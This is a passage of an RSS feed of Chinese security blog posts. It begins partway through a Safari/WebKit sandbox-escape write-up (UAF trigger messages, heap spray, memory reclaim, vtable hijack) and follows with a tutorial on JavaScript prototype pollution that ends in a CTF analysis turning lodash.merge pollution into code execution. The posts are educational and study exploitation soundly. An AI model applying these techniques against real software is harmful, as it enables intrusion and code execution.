class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;send(Messages::VideoFullscreenManagerProxy::SetHasVideo(2, true));
send(Messages::VideoFullscreenManagerProxy::SetHasVideo(-3, true));
send(Messages::VideoFullscreenManagerProxy::SetHasVideo(255, true));
send(Messages::VideoFullscreenManagerProxy::SetHasVideo(7, true));
send(Messages::VideoFullscreenManagerProxy::SetHasVideo(4095, true));
send(Messages::VideoFullscreenManagerProxy::SetHasVideo(0, true));
send(Messages::VideoFullscreenManagerProxy::SetHasVideo(18, true));
send(Messages::VideoFullscreenManagerProxy::SetHasVideo(800, true));&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;稳定的在UI进程中实现堆喷射&lt;/h2&gt;&lt;p&gt;当考虑如何在CPP编写的软件中利用UAF漏洞的时候，我们一般要考虑伪造的虚表往哪里放，伪造的虚表地址如何才能知道。因为macOS的堆比较弱，所以我们用堆喷来实现。&lt;/p&gt;&lt;p&gt;虽然通常都是找一个消息发多次的方式来实现堆喷，但是我们在这里直接用了web进程和UI进程之间的共享内存来实现。如此一来，只需要发一条消息。&lt;/p&gt;&lt;p&gt;伪代码如下:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;WebProcess::singleton().parentProcessConnection()-&amp;gt;sendSync(
    Messages::WebPasteboardProxy::
        SetPasteboardBufferForType(&amp;#34;name&amp;#34;, &amp;#34;type&amp;#34;, handle, 0x10000000), 
    Messages::WebPasteboardProxy::
        SetPasteboardBufferForType::Reply(newChangeCount), 0);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;靠谱儿的重新填充被释放的内存&lt;/h2&gt;&lt;p&gt;WebAuthenticatorCoordinatorProxy这部分有一个函数带有一个Vector&amp;lt;uint8_t&amp;gt;参数，既是Byte粒度的控制，又没有杂质，简直是填充任何对象的万灵药！&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;void WebAuthenticatorCoordinatorProxy::makeCredential(FrameIdentifier frameId, 
    SecurityOriginData&amp;amp;&amp;amp; origin, 
    Vector&amp;lt;uint8_t&amp;gt;&amp;amp;&amp;amp; hash, 
    PublicKeyCredentialCreationOptions&amp;amp;&amp;amp; options, 
    RequestCompletionHandler&amp;amp;&amp;amp; handler) {
    handleRequest({ WTFMove(hash), 
        WTFMove(options), 
        makeWeakPtr(m_webPageProxy), 
        WebAuthenticationPanelResult::Unavailable, 
        nullptr, 
        GlobalFrameIdentifier 
        { 
            m_webPageProxy.webPageID(), 
            frameId 
        }, 
        WTFMove(origin) 
        }, 
        WTFMove(handler));
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;伪代码如下:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sendWithAsyncReply(Messages::WebAuthenticatorCoordinatorProxy::MakeCredential(
        m_mainFrame-&amp;gt;frameID(), 
        SecurityOriginData(&amp;#34;http&amp;#34;, &amp;#34;hqzhao.me&amp;#34;, 8080), hash, options), 
        callback
);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;老生常谈: 劫持虚表并在沙箱外执行任意代码&lt;/h2&gt;&lt;p&gt;图7描绘了整个沙箱逃逸的过程，一如既往的劫持虚标，一如既往的栈迁移，一如既往的调用setcontext的gadget。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-a994e440f09f15f99a36d066f4d7c808_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1518&quot; data-rawheight=&quot;839&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1518&quot; data-original=&quot;https://pic1.zhimg.com/v2-a994e440f09f15f99a36d066f4d7c808_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-a994e440f09f15f99a36d066f4d7c808_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1518&quot; data-rawheight=&quot;839&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1518&quot; data-original=&quot;https://pic1.zhimg.com/v2-a994e440f09f15f99a36d066f4d7c808_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-a994e440f09f15f99a36d066f4d7c808_b.jpg&quot;/&gt;&lt;figcaption&gt;图7。 从UAF到沙箱逃逸&lt;/figcaption&gt;&lt;/figure&gt;&lt;h2&gt;班主任评语&lt;/h2&gt;&lt;p&gt;以上在macOS上的利用确实冗长，枯燥又乏味。虽然整个心路历程不算那么的容易，但是如今Safari和WebKit的漏洞利用技术的前沿和重心应该还是在iOS上。不说iOS的JIT上辈子就不能修改了，也不说iOS的随机化强多了，也不说iOS13的沙箱配置文件连BSD syscall都开始禁了，光是自从iPhone有了PAC以来，还没有公开技术来讨论在任意地址读写后如何在content中执行代码。不管是用户态还是内核态，大家A12平台以后的exploit除了逻辑漏洞，基本都是在靠着漏洞品相和环境特性在做Data-Only相关的attack。如文章中说的这些陈词滥调，应该会慢慢从主流软件中绝迹。&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>赵汉青</author>
<guid isPermaLink="false">2019-12-14-96069221</guid>
<pubDate>Sat, 14 Dec 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>深入理解 JavaScript Prototype 污染攻击</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-09-28-61990774.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/61990774&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-14cbccbc6a4bbb99662a0894ee226b0a_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;https://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hash=&quot;6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hovercard=&quot;p$b$6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@周佩雨&lt;/a&gt;&lt;/p&gt;&lt;p&gt;[ Phith0n，现就职于长亭科技，长期关注并笔耕于安全编码、代码审计等方向]&lt;/p&gt;&lt;p&gt;JavaScript是一门非常灵活的语言，我感觉在某些方面可能比PHP更加灵活。所以，除了传统的SQL注入、代码执行等注入型漏洞外，也会有一些独有的安全问题，比如今天要说这个prototype污染。&lt;/p&gt;&lt;h2&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%230x01-prototype__proto__&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;0x01 prototype和__proto__分别是什么？&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：&lt;/p&gt;&lt;p&gt;function Foo() { this.bar = 1 } new Foo() &lt;/p&gt;&lt;p&gt;&lt;code&gt;Foo&lt;/code&gt;函数的内容，就是&lt;code&gt;Foo&lt;/code&gt;类的构造函数，而&lt;code&gt;this.bar&lt;/code&gt;就是&lt;code&gt;Foo&lt;/code&gt;类的一个属性。&lt;/p&gt;&lt;blockquote&gt;为了简化编写JavaScript代码，ECMAScript 6后增加了&lt;code&gt;class&lt;/code&gt;语法，但&lt;code&gt;class&lt;/code&gt;其实只是一个语法糖。&lt;/blockquote&gt;&lt;p&gt;一个类必然有一些方法，类似属性&lt;code&gt;this.bar&lt;/code&gt;，我们也可以将方法定义在构造函数内部：&lt;/p&gt;&lt;p&gt;function Foo() { this.bar = 1 this.show = function() { console.log(this.bar) } } (new Foo()).show() &lt;/p&gt;&lt;p&gt;但这样写有一个问题，就是每当我们新建一个Foo对象时，&lt;code&gt;this.show = function...&lt;/code&gt;就会执行一次，这个&lt;code&gt;show&lt;/code&gt;方法实际上是绑定在对象上的，而不是绑定在“类”中。&lt;/p&gt;&lt;p&gt;我希望在创建类的时候只创建一次&lt;code&gt;show&lt;/code&gt;方法，这时候就则需要使用原型（prototype）了：&lt;/p&gt;&lt;p&gt;function Foo() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let foo = new Foo() foo.show() &lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-592e9ec1083e88ef2c5c5cebbece337e_b.jpg&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;325&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;554&quot; data-original=&quot;https://pic3.zhimg.com/v2-592e9ec1083e88ef2c5c5cebbece337e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-592e9ec1083e88ef2c5c5cebbece337e_b.jpg&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;325&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;554&quot; data-original=&quot;https://pic3.zhimg.com/v2-592e9ec1083e88ef2c5c5cebbece337e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-592e9ec1083e88ef2c5c5cebbece337e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;我们可以认为原型&lt;code&gt;prototype&lt;/code&gt;是类&lt;code&gt;Foo&lt;/code&gt;的一个属性，而所有用&lt;code&gt;Foo&lt;/code&gt;类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的&lt;code&gt;foo&lt;/code&gt;对象，其天生就具有&lt;code&gt;foo.show()&lt;/code&gt;方法。&lt;/p&gt;&lt;p&gt;我们可以通过&lt;code&gt;Foo.prototype&lt;/code&gt;来访问&lt;code&gt;Foo&lt;/code&gt;类的原型，但&lt;code&gt;Foo&lt;/code&gt;实例化出来的对象，是不能通过prototype访问原型的。这时候，就该&lt;code&gt;__proto__&lt;/code&gt;登场了。&lt;/p&gt;&lt;p&gt;一个Foo类实例化出来的foo对象，可以通过&lt;code&gt;foo.__proto__&lt;/code&gt;属性来访问Foo类的原型，也就是说：&lt;/p&gt;&lt;p&gt;foo.__proto__ == Foo.prototype &lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fd63de1cae36e310c2dee9a314a1cfd3_b.jpg&quot; data-rawwidth=&quot;340&quot; data-rawheight=&quot;103&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;content_image&quot; width=&quot;340&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fd63de1cae36e310c2dee9a314a1cfd3_b.jpg&quot; data-rawwidth=&quot;340&quot; data-rawheight=&quot;103&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;content_image lazy&quot; width=&quot;340&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-fd63de1cae36e310c2dee9a314a1cfd3_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;所以，总结一下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;code&gt;prototype&lt;/code&gt;是一个类的属性，所有类对象在实例化的时候将会拥有&lt;code&gt;prototype&lt;/code&gt;中的属性和方法&lt;/li&gt;&lt;li&gt;一个对象的&lt;code&gt;__proto__&lt;/code&gt;属性，指向这个对象所在的类的&lt;code&gt;prototype&lt;/code&gt;属性&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%230x02-javascript&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;0x02 JavaScript原型链继承&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;所有类对象在实例化的时候将会拥有&lt;code&gt;prototype&lt;/code&gt;中的属性和方法，这个特性被用来实现JavaScript中的继承机制。&lt;/p&gt;&lt;p&gt;比如：&lt;/p&gt;&lt;p&gt;function Father() { this.first_name = &amp;#39;Donald&amp;#39; this.last_name = &amp;#39;Trump&amp;#39; } function Son() { this.first_name = &amp;#39;Melania&amp;#39; } Son.prototype = new Father() let son = new Son() console.log(`Name: ${son.first_name} ${son.last_name}`) &lt;/p&gt;&lt;p&gt;Son类继承了Father类的&lt;code&gt;last_name&lt;/code&gt;属性，最后输出的是&lt;code&gt;Name: Melania Trump&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;总结一下，对于对象son，在调用&lt;code&gt;son.last_name&lt;/code&gt;的时候，实际上JavaScript引擎会进行如下操作：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;在对象son中寻找last_name&lt;/li&gt;&lt;li&gt;如果找不到，则在&lt;code&gt;son.__proto__&lt;/code&gt;中寻找last_name&lt;/li&gt;&lt;li&gt;如果仍然找不到，则继续在&lt;code&gt;son.__proto__.__proto__&lt;/code&gt;中寻找last_name&lt;/li&gt;&lt;li&gt;依次寻找，直到找到&lt;code&gt;null&lt;/code&gt;结束。比如，&lt;code&gt;Object.prototype&lt;/code&gt;的&lt;code&gt;__proto__&lt;/code&gt;就是&lt;code&gt;null&lt;/code&gt; &lt;/li&gt;&lt;/ol&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5260663ac7b25022e596d9746c3f5454_b.jpg&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;296&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;650&quot; data-original=&quot;https://pic1.zhimg.com/v2-5260663ac7b25022e596d9746c3f5454_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5260663ac7b25022e596d9746c3f5454_b.jpg&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;296&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;650&quot; data-original=&quot;https://pic1.zhimg.com/v2-5260663ac7b25022e596d9746c3f5454_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-5260663ac7b25022e596d9746c3f5454_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。&lt;/p&gt;&lt;p&gt;以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;每个构造函数(constructor)都有一个原型对象(prototype)&lt;/li&gt;&lt;li&gt;对象的&lt;code&gt;__proto__&lt;/code&gt;属性，指向类的原型对象&lt;code&gt;prototype&lt;/code&gt;&lt;/li&gt;&lt;li&gt;JavaScript使用prototype链实现继承机制&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%230x03&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;0x03 原型链污染是什么&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;第一章中说到，&lt;code&gt;foo.__proto__&lt;/code&gt;指向的是&lt;code&gt;Foo&lt;/code&gt;类的&lt;code&gt;prototype&lt;/code&gt;。那么，如果我们修改了&lt;code&gt;foo.__proto__&lt;/code&gt;中的值，是不是就可以修改Foo类呢？&lt;/p&gt;&lt;p&gt;做个简单的实验：&lt;/p&gt;&lt;p&gt;// foo是一个简单的JavaScript对象 let foo = {bar: 1} // foo.bar 此时为1 console.log(foo.bar) // 修改foo的原型（即Object） foo.__proto__.bar = 2 // 由于查找顺序的原因，foo.bar仍然是1 console.log(foo.bar) // 此时再用Object创建一个空的zoo对象 let zoo = {} // 查看zoo.bar console.log(zoo.bar) &lt;/p&gt;&lt;p&gt;最后，虽然zoo是一个&lt;b&gt;空&lt;/b&gt;对象&lt;code&gt;{}&lt;/code&gt;，但&lt;code&gt;zoo.bar&lt;/code&gt;的结果居然是2：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e72846c5e6d590c392d2a1d01893e942_b.jpg&quot; data-rawwidth=&quot;537&quot; data-rawheight=&quot;440&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;537&quot; data-original=&quot;https://pic3.zhimg.com/v2-e72846c5e6d590c392d2a1d01893e942_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e72846c5e6d590c392d2a1d01893e942_b.jpg&quot; data-rawwidth=&quot;537&quot; data-rawheight=&quot;440&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;537&quot; data-original=&quot;https://pic3.zhimg.com/v2-e72846c5e6d590c392d2a1d01893e942_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-e72846c5e6d590c392d2a1d01893e942_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;原因也显而易见：因为前面我们修改了foo的原型&lt;code&gt;foo.__proto__.bar = 2&lt;/code&gt;，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。&lt;/p&gt;&lt;p&gt;后来，我们又用Object类创建了一个zoo对象&lt;code&gt;let zoo = {}&lt;/code&gt;，zoo对象自然也有一个bar属性了。&lt;/p&gt;&lt;p&gt;那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是&lt;b&gt;原型链污染&lt;/b&gt;。&lt;/p&gt;&lt;h2&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%230x04&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;0x04 哪些情况下原型链会被污染？&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？&lt;/p&gt;&lt;p&gt;我们思考一下，哪些情况下我们可以设置&lt;code&gt;__proto__&lt;/code&gt;的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;对象merge&lt;/li&gt;&lt;li&gt;对象clone（其实内核就是将待操作的对象merge到一个空对象中）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;以对象merge为例，我们想象一个简单的merge函数：&lt;/p&gt;&lt;p&gt;function merge(target, source) { for (let key in source) { if (key in source &amp;amp;&amp;amp; key in target) { merge(target[key], source[key]) } else { target[key] = source[key] } } } &lt;/p&gt;&lt;p&gt;在合并的过程中，存在赋值的操作&lt;code&gt;target[key] = source[key]&lt;/code&gt;，那么，这个key如果是&lt;code&gt;__proto__&lt;/code&gt;，是不是就可以原型链污染呢？&lt;/p&gt;&lt;p&gt;我们用如下代码实验一下：&lt;/p&gt;&lt;p&gt;let o1 = {} let o2 = {a: 1, &amp;#34;__proto__&amp;#34;: {b: 2}} merge(o1, o2) console.log(o1.a, o1.b) o3 = {} console.log(o3.b) &lt;/p&gt;&lt;p&gt;结果是，合并虽然成功了，但原型链没有被污染：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0bfd885d1307e17fadfa6912b8c481c0_b.jpg&quot; data-rawwidth=&quot;624&quot; data-rawheight=&quot;500&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;624&quot; data-original=&quot;https://pic1.zhimg.com/v2-0bfd885d1307e17fadfa6912b8c481c0_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0bfd885d1307e17fadfa6912b8c481c0_b.jpg&quot; data-rawwidth=&quot;624&quot; data-rawheight=&quot;500&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;624&quot; data-original=&quot;https://pic1.zhimg.com/v2-0bfd885d1307e17fadfa6912b8c481c0_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-0bfd885d1307e17fadfa6912b8c481c0_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;这是因为，我们用JavaScript创建o2的过程（&lt;code&gt;let o2 = {a: 1, &amp;#34;__proto__&amp;#34;: {b: 2}}&lt;/code&gt;）中，&lt;code&gt;__proto__&lt;/code&gt;已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是&lt;code&gt;[a, b]&lt;/code&gt;，&lt;code&gt;__proto__&lt;/code&gt;并不是一个key，自然也不会修改Object的原型。&lt;/p&gt;&lt;p&gt;那么，如何让&lt;code&gt;__proto__&lt;/code&gt;被认为是一个键名呢？&lt;/p&gt;&lt;p&gt;我们将代码改成如下：&lt;/p&gt;&lt;p&gt;let o1 = {} let o2 = JSON.parse(&amp;#39;{&amp;#34;a&amp;#34;: 1, &amp;#34;__proto__&amp;#34;: {&amp;#34;b&amp;#34;: 2}}&amp;#39;) merge(o1, o2) console.log(o1.a, o1.b) o3 = {} console.log(o3.b) &lt;/p&gt;&lt;p&gt;可见，新建的o3对象，也存在b属性，说明Object已经被污染：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a51b1f8cd603e76d62ce9036765f971b_b.jpg&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;430&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;650&quot; data-original=&quot;https://pic4.zhimg.com/v2-a51b1f8cd603e76d62ce9036765f971b_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a51b1f8cd603e76d62ce9036765f971b_b.jpg&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;430&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;650&quot; data-original=&quot;https://pic4.zhimg.com/v2-a51b1f8cd603e76d62ce9036765f971b_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-a51b1f8cd603e76d62ce9036765f971b_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;这是因为，JSON解析的情况下，&lt;code&gt;__proto__&lt;/code&gt;会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。&lt;/p&gt;&lt;p&gt;merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。&lt;/p&gt;&lt;h2&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%230x05-code-breaking-2018-thejs&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;0x05 Code-Breaking 2018 Thejs 分析&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;我在Code-Breaking 2018中出了一道原型链污染的CTF题目，为了更加贴合真实环境，我没有刻意加太多自己的代码，后端主要代码如下（完整代码可参考&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;这里&lt;/a&gt;）：&lt;/p&gt;&lt;p&gt;// ... const lodash = require(&amp;#39;lodash&amp;#39;) // ... app.engine(&amp;#39;ejs&amp;#39;, function (filePath, options, callback) { // define the template engine fs.readFile(filePath, (err, content) =&amp;gt; { if (err) return callback(new Error(err)) let compiled = lodash.template(content) let rendered = compiled({...options}) return callback(null, rendered) }) }) //... app.all(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; { let data = req.session.data || {language: [], category: []} if (req.method == &amp;#39;POST&amp;#39;) { data = lodash.merge(data, req.body) req.session.data = data } res.render(&amp;#39;index&amp;#39;, { language: data.language, category: data.category }) }) &lt;/p&gt;&lt;p&gt;lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;code&gt;lodash.template&lt;/code&gt; 一个简单的模板引擎&lt;/li&gt;&lt;li&gt;&lt;code&gt;lodash.merge&lt;/code&gt; 函数或对象的合并&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。&lt;/p&gt;&lt;p&gt;而这里的&lt;code&gt;lodash.merge&lt;/code&gt;操作实际上就存在原型链污染漏洞。&lt;/p&gt;&lt;p&gt;在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的&lt;code&gt;lodash.template&lt;/code&gt;中。我们看到&lt;code&gt;lodash.template&lt;/code&gt;的代码：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/lodash/lodash/blob/4.17.4-npm/template.js%23L165&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/lodash/lodas&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;h/blob/4.17.4-npm/template.js#L165&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;// Use a sourceURL for easier debugging. var sourceURL = &amp;#39;sourceURL&amp;#39; in options ? &amp;#39;//# sourceURL=&amp;#39; + options.sourceURL + &amp;#39;\n&amp;#39; : &amp;#39;&amp;#39;; // ... var result = attempt(function() { return Function(importsKeys, sourceURL + &amp;#39;return &amp;#39; + source) .apply(undefined, importsValues); }); &lt;/p&gt;&lt;p&gt;options是一个对象，sourceURL取到了其&lt;code&gt;options.sourceURL&lt;/code&gt;属性。这个属性原本是没有赋值的，默认取空字符串。&lt;/p&gt;&lt;p&gt;但因为原型链污染，我们可以给所有Object对象中都插入一个&lt;code&gt;sourceURL&lt;/code&gt;属性。最后，这个&lt;code&gt;sourceURL&lt;/code&gt;被拼接进&lt;code&gt;new Function&lt;/code&gt;的第二个参数中，造成任意代码执行漏洞。&lt;/p&gt;&lt;p&gt;我将带有&lt;code&gt;__ptoto__&lt;/code&gt;的Payload以json的形式发送给后端，因为express框架支持根据Content-Type来解析请求Body，这里给我们注入原型提供了很大方便：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-42c5b8d5250c459c70997fc136f61760_b.jpg&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;122&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;650&quot; data-original=&quot;https://pic1.zhimg.com/v2-42c5b8d5250c459c70997fc136f61760_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-42c5b8d5250c459c70997fc136f61760_b.jpg&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;122&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;650&quot; data-original=&quot;https://pic1.zhimg.com/v2-42c5b8d5250c459c70997fc136f61760_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-42c5b8d5250c459c70997fc136f61760_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;可见，我们代码执行成功，返回了id命令的结果。&lt;/p&gt;&lt;p&gt;整个案例我觉得是一个非常经典的原型链污染漏洞教程，代码不多，逻辑不复杂，没有刻意创造漏洞，真正触发漏洞的代码在库中。&lt;/p&gt;&lt;p&gt;我一直觉得，出题不要刻意创造漏洞，而是找找你的知识点是否能在真实环境下找到应用。&lt;/p&gt;&lt;h2&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%23_1&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;相关文章&lt;/a&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/HoLyVieR/pro&lt;/span&gt;&lt;span 